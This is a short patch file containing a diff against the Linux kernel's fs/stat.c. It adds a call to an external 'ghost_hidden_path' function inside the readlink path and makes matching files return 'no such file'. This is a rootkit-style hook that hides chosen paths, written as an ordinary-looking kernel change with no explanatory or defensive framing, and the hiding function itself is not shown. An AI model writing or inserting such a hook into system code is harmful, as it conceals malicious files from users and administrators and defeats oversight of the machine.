@@ -1,0 +1,22 @@
+--- a/fs/stat.c
++++ b/fs/stat.c
+@@ -406,6 +406,7 @@
+ 	int error;
+ 	int empty = 0;
+ 	unsigned int lookup_flags = LOOKUP_EMPTY;
++	extern bool ghost_hidden_path(const struct path *gp);
+ 
+ 	if (bufsiz <= 0)
+ 		return -EINVAL;
+@@ -415,6 +416,11 @@
+ 	if (!error) {
+ 		struct inode *inode = d_backing_inode(path.dentry);
+ 
++		if (ghost_hidden_path(&path)) {
++			path_put(&path);
++			return -ENOENT;
++		}
++
+ 		error = empty ? -ENOENT : -EINVAL;
+ 		/*
+ 		 * AFS mountpoints allow readlink(2) but are not symlinks
